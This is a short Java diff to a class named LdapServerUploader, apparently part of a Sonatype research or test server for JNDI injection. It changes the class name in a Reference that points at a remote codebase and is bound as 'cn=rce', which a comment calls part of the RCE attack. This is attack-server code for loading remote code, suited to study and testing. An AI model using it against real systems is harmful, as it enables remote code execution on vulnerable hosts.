@@ -75,7 +75,7 @@ public class LdapServerUploader {
         ctx.bind("cn=404", "nope - no idea");
 
         // reference object - part of the RCE attack
-        Reference ref = new Reference("ExternalObject", "ExternalObject", refserver + "/code/");
+        Reference ref = new Reference("dev.sonatype.slyserver.hacks.ExternalObject", "dev.sonatype.slyserver.hacks.ExternalObject", refserver + "/code/");
         ctx.bind("cn=rce", ref);
 
         ctx.bind("cn=boom",new String[][]{new String[]{"a"}});
